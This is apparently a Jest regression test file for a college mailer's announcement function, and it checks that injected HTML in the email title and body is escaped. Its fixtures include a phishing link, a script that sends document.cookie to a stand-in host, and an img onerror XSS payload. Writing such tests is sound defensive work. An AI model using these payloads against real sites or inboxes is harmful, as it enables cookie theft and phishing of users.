/**
 * H4 regression, part 3 — the last step of the chain.
 *
 * `sendAnnouncementEmail` built its HTML by hand:
 *
 *     const html = wrap(title, `<p>${announcement.body.replace(/\n/g, '<br/>')}</p>`);
 *
 * so an `<a href>` that reached the body became a live, clickable link in every
 * recipient's inbox — delivered over a verified Brevo sender, with SPF and DKIM
 * passing. That is the difference between a phish a student can see and one
 * they can click, and `esc()` was already defined in the same file and used
 * correctly two functions further down.
 *
 * This layer is last on purpose. Everything above it should stop a poisoned
 * body from ever arriving here; these tests describe what happens when they
 * all fail at once.
 */

const { sendAnnouncementEmail, esc } = require('../config/mailer');
const mailTransport = require('../config/mailTransport');

const recipients = [{ email: 'student@college.edu', name: 'Student' }];

/** Capture the HTML that would have gone out, without a transport. */
function captureSend() {
  jest.spyOn(mailTransport, 'isConfigured').mockReturnValue(true);
  return jest
    .spyOn(mailTransport, 'deliver')
    .mockResolvedValue({ delivered: true, provider: 'test', attempts: 1 });
}

afterEach(() => jest.restoreAllMocks());

describe('sendAnnouncementEmail escaping', () => {
  it('renders an injected anchor as text, not as a clickable link', async () => {
    const deliver = captureSend();

    await sendAnnouncementEmail(recipients, {
      title: 'Security Alert',
      body: '<a href="http://phish.example/reset">Click here to reset your password</a>',
    });

    const { html } = deliver.mock.calls[0][0];
    // The payload is visible...
    expect(html).toContain('phish.example');
    // ...but inert. No anchor tag survives into the markup.
    expect(html).not.toContain('<a href="http://phish.example/reset">');
    expect(html).toContain('&lt;a href=&quot;http://phish.example/reset&quot;&gt;');
  });

  it('neutralises a script tag in the body', async () => {
    const deliver = captureSend();
    await sendAnnouncementEmail(recipients, {
      title: 'Weekly',
      body: '<script>fetch("http://phish.example?c="+document.cookie)</script>',
    });

    const { html } = deliver.mock.calls[0][0];
    expect(html).not.toContain('<script>');
    expect(html).toContain('&lt;script&gt;');
  });

  it('escapes the title, which lands inside the template heading', async () => {
    const deliver = captureSend();
    await sendAnnouncementEmail(recipients, {
      title: '</h2><img src=x onerror="alert(1)">',
      body: 'ordinary text',
    });

    const { html } = deliver.mock.calls[0][0];
    expect(html).not.toMatch(/<img[^>]*onerror/i);
    expect(html).toContain('&lt;img src=x onerror=');
  });

  it('keeps the subject line as plain text, not HTML entities', async () => {
    // Escaping the subject would show a literal `&amp;` in the inbox. Only the
    // HTML body is escaped; the subject is a plain-text header.
    const deliver = captureSend();
    await sendAnnouncementEmail(recipients, { title: 'Cases & Careers', body: 'hi' });

    expect(deliver.mock.calls[0][0].subject).toBe('📢 Cases & Careers');
  });

  it('still turns real newlines into line breaks', async () => {
    // The formatting the escape must not cost us: paragraphs still render.
    const deliver = captureSend();
    await sendAnnouncementEmail(recipients, { title: 'Weekly', body: 'line one\nline two' });

    const { html } = deliver.mock.calls[0][0];
    expect(html).toContain('line one<br/>line two');
  });

  it('sends one message per recipient, never a shared To header', async () => {
    // Unrelated to H4, but it lives in the same function and a rewrite of this
    // path is exactly where it would be lost: a shared To would disclose every
    // student's address to every other student.
    const deliver = captureSend();
    await sendAnnouncementEmail(
      [
        { email: 'a@college.edu', name: 'A' },
        { email: 'b@college.edu', name: 'B' },
      ],
      { title: 'Weekly', body: 'hi' }
    );

    expect(deliver).toHaveBeenCalledTimes(2);
    for (const [msg] of deliver.mock.calls) {
      expect(msg.toAddresses).toHaveLength(1);
    }
  });
});

describe('esc', () => {
  it('escapes every character that can open a tag or an attribute', () => {
    expect(esc(`<>&"'`)).toBe('&lt;&gt;&amp;&quot;&#39;');
  });

  it('handles null and undefined without throwing', () => {
    expect(esc(null)).toBe('');
    expect(esc(undefined)).toBe('');
  });
});
